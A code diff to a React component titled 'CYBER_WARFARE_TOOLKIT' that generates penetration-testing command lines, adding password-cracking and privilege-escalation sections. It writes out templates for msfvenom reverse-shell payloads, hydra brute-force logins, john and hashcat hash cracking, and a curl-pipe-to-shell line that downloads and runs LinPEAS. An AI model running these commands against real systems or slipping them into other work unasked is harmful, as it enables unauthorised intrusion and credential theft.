@@ -6,22 +6,26 @@ interface HackingToolkitProps {
   onClose: () => void;
 }
 
-type ToolCategory = 'NETWORK' | 'WEB' | 'WIFI' | 'PAYLOAD';
+type ToolCategory = 'NETWORK' | 'WEB' | 'WIFI' | 'PAYLOAD' | 'CRACKING' | 'ENUM';
 
 export const HackingToolkit: React.FC<HackingToolkitProps> = ({ isOpen, onClose }) => {
   const [activeCategory, setActiveCategory] = useState<ToolCategory>('NETWORK');
   
   // Inputs State
   const [targetIp, setTargetIp] = useState('192.168.1.1');
-  const [targetUrl, setTargetUrl] = useState('http://example.com/id=1');
+  const [targetUrl, setTargetUrl] = useState('http://example.com/login.php');
   const [interfaceName, setInterfaceName] = useState('wlan0mon');
   const [lhost, setLhost] = useState('10.0.0.1');
   const [lport, setLport] = useState('4444');
   const [bssid, setBssid] = useState('00:11:22:33:44:55');
+  const [username, setUsername] = useState('admin');
+  const [wordlist, setWordlist] = useState('/usr/share/wordlists/rockyou.txt');
   
   // Options State
-  const [nmapMode, setNmapMode] = useState('STEALTH'); // STEALTH, AGGRESSIVE, VULN
+  const [nmapMode, setNmapMode] = useState('STEALTH'); 
   const [payloadType, setPayloadType] = useState('windows/meterpreter/reverse_tcp');
+  const [crackTool, setCrackTool] = useState('HYDRA');
+  const [service, setService] = useState('ssh');
 
   if (!isOpen) return null;
 
@@ -42,6 +46,13 @@ export const HackingToolkit: React.FC<HackingToolkitProps> = ({ isOpen, onClose 
         if (payloadType.includes('android')) ext = 'apk';
         if (payloadType.includes('python')) ext = 'py';
         return `msfvenom -p ${payloadType} LHOST=${lhost} LPORT=${lport} -f ${ext} > shell.${ext}`;
+      case 'CRACKING':
+        if (crackTool === 'HYDRA') return `hydra -l ${username} -P ${wordlist} ${targetIp} ${service} -V`;
+        if (crackTool === 'JOHN') return `john --wordlist=${wordlist} --format=raw-md5 hashes.txt`;
+        if (crackTool === 'HASHCAT') return `hashcat -m 0 -a 0 -o cracked.txt hashes.txt ${wordlist}`;
+        return '';
+      case 'ENUM':
+        return `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`;
       default:
         return '';
     }
@@ -54,13 +65,13 @@ export const HackingToolkit: React.FC<HackingToolkitProps> = ({ isOpen, onClose 
 
   return (
     <div className="fixed inset-0 z-[70] flex items-center justify-center bg-black/90 backdrop-blur-sm p-4">
-      <div className="w-full max-w-4xl bg-black border border-cyber-matrix shadow-[0_0_30px_rgba(0,255,65,0.15)] rounded-lg flex flex-col overflow-hidden h-[80vh]">
+      <div className="w-full max-w-5xl bg-black border border-cyber-matrix shadow-[0_0_30px_rgba(0,255,65,0.15)] rounded-lg flex flex-col overflow-hidden h-[85vh]">
         
         {/* Header */}
         <div className="bg-gray-900 p-4 border-b border-cyber-matrix/30 flex justify-between items-center">
           <div className="flex items-center gap-3">
             <i className="fas fa-dragon text-cyber-matrix text-xl"></i>
-            <h2 className="text-cyber-matrix font-mono text-lg font-bold tracking-wider">CYBER_WARFARE_TOOLKIT_v1.0</h2>
+            <h2 className="text-cyber-matrix font-mono text-lg font-bold tracking-wider">CYBER_WARFARE_TOOLKIT_v2.0</h2>
           </div>
           <button onClick={onClose} className="text-gray-500 hover:text-white transition-colors">
             <i className="fas fa-times text-xl"></i>
@@ -69,8 +80,8 @@ export const HackingToolkit: React.FC<HackingToolkitProps> = ({ isOpen, onClose 
 
         <div className="flex flex-1 overflow-hidden">
           {/* Sidebar Menu */}
-          <div className="w-48 bg-gray-900/50 border-r border-white/5 p-2 space-y-1">
-            {(['NETWORK', 'WEB', 'WIFI', 'PAYLOAD'] as ToolCategory[]).map((cat) => (
+          <div className="w-56 bg-gray-900/50 border-r border-white/5 p-2 space-y-1 overflow-y-auto">
+            {(['NETWORK', 'WEB', 'WIFI', 'PAYLOAD', 'CRACKING', 'ENUM'] as ToolCategory[]).map((cat) => (
               <button
                 key={cat}
                 onClick={() => setActiveCategory(cat)}
@@ -94,10 +105,12 @@ export const HackingToolkit: React.FC<HackingToolkitProps> = ({ isOpen, onClose 
 
             <div className="relative z-10">
               <h3 className="text-white font-mono text-xl mb-6 border-b border-gray-700 pb-2">
-                {activeCategory === 'NETWORK' && 'NMAP SCANNER BUILDER'}
-                {activeCategory === 'WEB' && 'SQLMAP INJECTOR'}
-                {activeCategory === 'WIFI' && 'AIRCRACK-NG SUITE'}
-                {activeCategory === 'PAYLOAD' && 'MSFVENOM GENERATOR'}
+                {activeCategory === 'NETWORK' && 'NMAP ADVANCED SCANNER'}
+                {activeCategory === 'WEB' && 'SQLMAP INJECTION SUITE'}
+                {activeCategory === 'WIFI' && 'AIRCRACK-NG WIFI AUDIT'}
+                {activeCategory === 'PAYLOAD' && 'MSFVENOM PAYLOAD FACTORY'}
+                {activeCategory === 'CRACKING' && 'PASSWORD HASH CRACKER'}
+                {activeCategory === 'ENUM' && 'PRIVILEGE ESCALATION SCRIPTS'}
               </h3>
 
               <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
@@ -202,6 +215,47 @@ export const HackingToolkit: React.FC<HackingToolkitProps> = ({ isOpen, onClose 
                   </>
                 )}
 
+                {activeCategory === 'CRACKING' && (
+                  <>
+                    <div className="space-y-2">
+                      <label className="text-cyber-matrix text-xs font-bold">TOOL SELECTION</label>
+                      <select 
+                        value={crackTool}
+                        onChange={(e) => setCrackTool(e.target.value)}
+                        className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
+                      >
+                        <option value="HYDRA">HYDRA (Online Bruteforce)</option>
+                        <option value="JOHN">JOHN THE RIPPER (Offline)</option>
+                        <option value="HASHCAT">HASHCAT (GPU Cracking)</option>
+                      </select>
+                    </div>
+                    
+                    {crackTool === 'HYDRA' && (
+                        <>
+                            <div className="space-y-2">
+                                <label className="text-cyber-matrix text-xs font-bold">SERVICE</label>
+                                <input type="text" value={service} onChange={(e) => setService(e.target.value)} className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded outline-none font-mono" />
+                            </div>
+                            <div className="space-y-2">
+                                <label className="text-cyber-matrix text-xs font-bold">USERNAME</label>
+                                <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded outline-none font-mono" />
+                            </div>
+                        </>
+                    )}
+                     <div className="col-span-2 space-y-2">
+                        <label className="text-cyber-matrix text-xs font-bold">WORDLIST PATH</label>
+                        <input type="text" value={wordlist} onChange={(e) => setWordlist(e.target.value)} className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded outline-none font-mono" />
+                     </div>
+                  </>
+                )}
+                
+                {activeCategory === 'ENUM' && (
+                    <div className="col-span-2 p-4 bg-gray-900/50 border border-gray-700 rounded">
+                        <p className="text-sm text-gray-300 mb-2">Currently configured for: <span className="text-cyber-matrix font-bold">LinPEAS (Linux Privilege Escalation)</span></p>
+                        <p className="text-xs text-gray-500">This will generate a command to download and execute the latest LinPEAS script directly from memory.</p>
+                    </div>
+                )}
+
               </div>
 
               {/* Output Area */}
@@ -215,14 +269,14 @@ export const HackingToolkit: React.FC<HackingToolkitProps> = ({ isOpen, onClose 
                     <i className="fas fa-copy mr-1"></i> COPY
                   </button>
                 </div>
-                <div className="font-mono text-green-500 break-all bg-gray-900/50 p-3 rounded border border-green-900/30">
-                  <span className="text-blue-400 mr-2">$</span>
+                <div className="font-mono text-green-500 break-all bg-gray-900/50 p-3 rounded border border-green-900/30 shadow-[inset_0_0_10px_rgba(0,0,0,0.5)]">
+                  <span className="text-blue-400 mr-2 select-none">$</span>
                   {generateCommand()}
                 </div>
               </div>
               
               <div className="mt-6 p-3 bg-red-900/20 border border-red-500/30 rounded text-xs text-red-300 font-mono flex items-start gap-3">
-                <i className="fas fa-exclamation-triangle mt-0.5"></i>
+                <i className="fas fa-exclamation-triangle mt-0.5 text-red-500"></i>
                 <div>
                   <strong>WARNING:</strong> These commands are real and powerful. Unauthorized use against systems you do not own is illegal. Use strictly for educational purposes or authorized penetration testing.
                 </div>
